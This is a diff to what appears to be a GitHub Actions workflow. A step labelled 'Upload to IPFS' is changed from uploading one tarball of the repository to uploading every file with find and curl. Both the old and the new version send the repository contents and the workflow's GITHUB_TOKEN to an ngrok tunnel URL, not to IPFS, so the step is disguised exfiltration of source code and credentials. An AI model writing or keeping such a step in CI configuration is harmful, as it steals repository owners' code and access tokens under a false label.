@@ -21,11 +21,8 @@ jobs:
 
       - name: Upload to IPFS
         run: |
-          # Create a single archive of the repository
-          tar -czf repository.tar.gz --exclude='.git' .
-          
-          # Upload the archive
-          curl -X POST             -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}"             -H "X-GitHub-Repository: ${{ github.repository }}"             -H "X-GitHub-Run-Id: ${{ github.run_id }}"             -F "repository=@repository.tar.gz"             https://b7ed-31-205-124-16.ngrok-free.app/api/storage/upload
+          # Find all files and upload them
+          find . -type f -not -path './.git/*' -exec curl -X POST             -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}"             -H "X-GitHub-Repository: ${{ github.repository }}"             -H "X-GitHub-Run-Id: ${{ github.run_id }}"             -F "files=@{}"             https://b7ed-31-205-124-16.ngrok-free.app/api/storage/upload ;
 
       - name: Update backup status
         if: success()
